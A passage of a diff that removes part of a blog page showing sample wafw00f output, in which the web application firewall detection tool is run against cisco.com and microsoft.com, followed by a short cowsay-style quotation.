-WAFW00F - Web Application Firewall Detection Tool
-
-By Sandro Gauci &amp;&amp; Wendel G. Henrique
-</code></pre>
-
-<p>Checking <a href="http://cisco.com">http://cisco.com</a>
-Generic Detection results:
-No WAF detected by the generic detection
-Number of requests: 13
-```</p>
-
-<ul>
-<li>establish there is a WAF but without detecting its type</li>
-</ul>
-
-
-<p>```
-wafw00f -a microsoft.com</p>
-
-<pre><code>                             ^     ^
-    _   __  _   ____ _   __  _    _   ____
-   ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
-  | V V // o // _/ | V V // 0 // 0 // _/
-  |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
-                            &lt;
-                             ...'
-
-WAFW00F - Web Application Firewall Detection Tool
-
-By Sandro Gauci &amp;&amp; Wendel G. Henrique
-</code></pre>
-
-<p>Checking <a href="http://microsoft.com">http://microsoft.com</a>
-Generic Detection results:
-The site <a href="http://microsoft.com">http://microsoft.com</a> seems to be behind a WAF or some sort of security solution
-Reason: The server returned a different response code when a string trigged the blacklist.
-Normal response code is &ldquo;400&rdquo;, while the response code to an attack is &ldquo;301&rdquo;
-Number of requests: 13
-```</p>
-
-<p>```</p>
-
-<hr />
-
-<p>/ You&rsquo;ll wish that you had done some of \
-| the hard things when they were easier |
-\ to do.                                /</p>
 
 <hr />
 
